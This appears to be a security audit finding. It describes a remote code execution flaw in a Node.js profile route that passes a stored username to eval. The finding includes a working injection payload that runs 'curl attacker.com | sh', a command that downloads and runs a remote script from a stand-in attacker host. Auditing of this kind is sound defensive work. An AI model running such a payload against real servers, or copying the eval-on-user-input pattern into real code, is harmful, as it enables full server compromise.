  title: Remote code execution — routes/userProfile.ts:61
  affected_parameter: username (user model field)
  scenario: 'GET /profile reads the authenticated user''s username from the database and, if it matches the pattern `#{...}`,
    extracts the inner expression and evaluates it with `eval(code)` at routes/userProfile.ts:61. An attacker sets their username
    to `#{process.mainModule.require(''child_process'').execSync(''curl attacker.com | sh'').toString()}` via `POST /profile`
    (which calls `user.update({ username: req.body.username })` at updateUserProfile.ts:38 with no sanitization). On next
    profile visit, the server executes the OS command with Node.js process privileges, enabling full server compromise.'
  evidence_summary: routes/userProfile.ts:61 calls `eval(code)` where `code` is extracted from the stored username field after
    a regex match on `#{...}`.
  impact_description: Arbitrary OS command execution with Node.js server process privileges — full server compromise, data
    exfiltration, lateral movement.
  likelihood: High
  impact: Critical
  risk: Critical
  controls_in_place: The eval path is only triggered when challenge is enabled (`utils.isChallengeEnabled`), but this is on
    by default.
